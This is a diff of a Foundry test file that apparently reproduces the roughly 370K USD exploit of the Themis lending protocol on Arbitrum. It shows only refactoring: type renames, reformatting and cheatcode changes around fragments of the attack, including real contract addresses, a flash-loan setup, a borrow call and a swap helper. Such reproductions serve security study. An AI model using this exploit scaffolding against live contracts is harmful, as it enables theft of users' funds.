@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~370K USD$
 // Attacker : https://arbiscan.io/address/0xdb73eb484e7dea3785520d750eabef50a9b9ab33
@@ -21,13 +20,8 @@ interface IThemis {
 
     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
 
-    function borrow(
-        address asset,
-        uint256 amount,
-        uint256 interestRateMode,
-        uint16 referralCode,
-        address onBehalfOf
-    ) external;
+    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+        external;
 
 }
 
@@ -56,8 +50,8 @@ contract ThemisTest is Test {
     IPool BalancerPool = IPool(0x36bf227d6BaC96e2aB1EbB5492ECec69C691943f);
     IGauge BalancerGauge = IGauge(0x8F0B53F3BA19Ee31C0A73a6F6D84106340fadf5f);
     IAaveFlashloan AaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
-    Uni_Pair_V3 UniPool1 = Uni_Pair_V3(0x2f5e87C9312fa29aed5c179E456625D79015299c);
-    Uni_Pair_V3 UniPool2 = Uni_Pair_V3(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
+    IUniswapV3Pair UniPool1 = IUniswapV3Pair(0x2f5e87C9312fa29aed5c179E456625D79015299c);
+    IUniswapV3Pair UniPool2 = IUniswapV3Pair(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
     IBalancerVault BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IThemis AttackedThemisContract = IThemis(0x75F805e2fB248462e7817F0230B36E9Fae0280Fc);
     IAggregator Aggregator = IAggregator(0x17df2B52f5D756420846c78c69F4fE4fF10e57A4);
@@ -72,14 +66,13 @@ contract ThemisTest is Test {
     address private constant DAI_USDC = 0xd37Af656Abf91c7f548FfFC0133175b5e4d3d5e6;
     address private constant WETH_ARB = 0x92c63d0e701CAAe670C9415d91C474F686298f00;
     address private constant WBTC_WETH = 0x2f5e87C9312fa29aed5c179E456625D79015299c;
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("arbitrum", 105_524_523);
-        cheats.label(address(WETH), "WETH");
-        cheats.label(address(AaveV3), "AaveV3");
-        cheats.label(address(UniPool1), "UniPool1");
-        cheats.label(address(UniPool2), "UniPool2");
+        vm.createSelectFork("arbitrum", 105_524_523);
+        vm.label(address(WETH), "WETH");
+        vm.label(address(AaveV3), "AaveV3");
+        vm.label(address(UniPool1), "UniPool1");
+        vm.label(address(UniPool2), "UniPool2");
     }
 
     function testExploit() public {
@@ -184,13 +177,10 @@ contract ThemisTest is Test {
         AttackedThemisContract.borrow(token, borrowAmount, 2, 0, address(this));
     }
 
-    function uniswapV3Swap(
-        address uniswapPool,
-        bool zeroForOne,
-        uint256 amountSpecified,
-        uint160 sqrtPriceLimit
-    ) internal {
-        Uni_Pair_V3(uniswapPool).swap(address(this), zeroForOne, int256(amountSpecified), sqrtPriceLimit, "");
+    function uniswapV3Swap(address uniswapPool, bool zeroForOne, uint256 amountSpecified, uint160 sqrtPriceLimit)
+        internal
+    {
+        IUniswapV3Pair(uniswapPool).swap(address(this), zeroForOne, int256(amountSpecified), sqrtPriceLimit, "");
     }
 
     receive() external payable {}
